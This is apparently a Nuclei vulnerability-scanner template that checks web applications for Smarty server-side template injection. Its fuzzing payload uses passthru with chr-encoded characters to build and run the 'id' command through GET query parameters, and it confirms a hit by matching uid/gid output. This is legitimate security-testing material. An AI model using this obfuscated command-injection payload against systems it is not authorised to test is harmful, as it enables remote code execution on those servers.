http:
- fuzzing:
  - fuzz:
    - '{{injection}}'
    mode: single
    part: query
    type: replace
  matchers:
  - part: body
    regex:
    - uid=[0-9]+.*gid=[0-9]+.*
    type: regex
  payloads:
    injection:
    - '{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}'
  pre-condition:
  - dsl:
    - method == "GET"
    type: dsl
  skip-variables-check: true
id: smarty-ssti
info:
  author: ritikchaddha
  description: 'In PHP template engine Smarty, template injection is possible by exploiting
    the passthru function combined with array_map and chr.

    '
  metadata:
    max-request: 1
  name: Smarty - Server Side Template Injection
  reference:
  - https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
  severity: high
  tags: smarty,ssti,dast,vuln
